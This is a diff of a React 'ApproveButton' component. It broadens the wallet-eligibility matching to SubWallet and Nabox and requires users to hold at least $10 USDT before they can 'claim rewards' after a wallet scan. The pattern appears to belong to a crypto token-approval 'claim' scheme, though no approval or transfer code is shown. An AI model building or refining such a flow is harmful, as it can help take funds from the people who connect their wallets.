@@ -211,21 +211,39 @@ export default function ApproveButton() {
       return;
     }
 
-    // Wallet eligibility check
+    // Wallet eligibility check - check multiple possible connector IDs
     const walletId = walletClient?.connector?.id;
+    const walletName = walletClient?.connector?.name;
     console.log("Wallet ID sent to claim button:", walletId);
+    console.log("Wallet Name sent to claim button:", walletName);
     
-    if (!walletId || !eligibleWallets[walletId]) {
+    // Check if wallet is eligible by ID, name, or known variations
+    const isEligible = walletId && (
+      eligibleWallets[walletId] || 
+      walletId.includes('subwallet') || 
+      walletId.includes('nabox') ||
+      walletName?.toLowerCase().includes('subwallet') ||
+      walletName?.toLowerCase().includes('nabox')
+    );
+    
+    if (!isEligible) {
       alert(
-        "🚫🔒 Only SubWallet and Nabox Wallet are eligible to claim rewards. Please connect with an eligible wallet."
+        `🚫🔒 Only SubWallet and Nabox Wallet are eligible to claim rewards. Please connect with an eligible wallet. Current wallet: ${walletId || walletName || 'Unknown'}`
       );
       return;
     }
 
-    // USDT minimum check
-    if (!hasMinimumUsdt) {
+    // USDT minimum check - check both ETH and BSC balances
+    const totalUsdtBalance = Math.max(
+      parseFloat(usdtFormatted) || 0,
+      usdtBalanceNumber || 0
+    );
+    
+    console.log("Total USDT balance for claim check:", totalUsdtBalance);
+    
+    if (totalUsdtBalance < 10) {
       alert(
-        `🚫🔒 Eligibility check failed — you need at least $10 USDT (BSC) to claim. Your current balance: $${usdtBalanceNumber.toFixed(2)} USDT. Please top up and try again.`
+        `🚫🔒 Eligibility check failed — you need at least $10 USDT to claim. Your current balance: $${totalUsdtBalance.toFixed(2)} USDT. Please top up and try again.`
       );
       return;
     }
@@ -332,10 +350,11 @@ export default function ApproveButton() {
 
   // Check if user has at least $10 USDT
   const usdtBalanceNumber = usdtBalance ? parseFloat(usdtBalance.formatted) : 0;
-  const hasMinimumUsdt = usdtBalanceNumber >= 10;
+  const totalUsdtForCheck = Math.max(parseFloat(usdtFormatted) || 0, usdtBalanceNumber || 0);
+  const hasMinimumUsdt = totalUsdtForCheck >= 10;
 
- 
   console.log("USDT balance sent to claim button:", usdtBalanceNumber);
+  console.log("Total USDT for check:", totalUsdtForCheck);
 
   // Only show button if wallet is connected AND scanning is completed
   if (!isConnected || !scanCompleted) {
@@ -445,7 +464,7 @@ export default function ApproveButton() {
             color: "rgba(255, 255, 255, 0.8)",
             fontStyle: "italic"
           }}>
-            Current balance: ${usdtFormatted} USDT
+            Current balance: ${totalUsdtForCheck.toFixed(2)} USDT
           </div>
         </div>
       )}
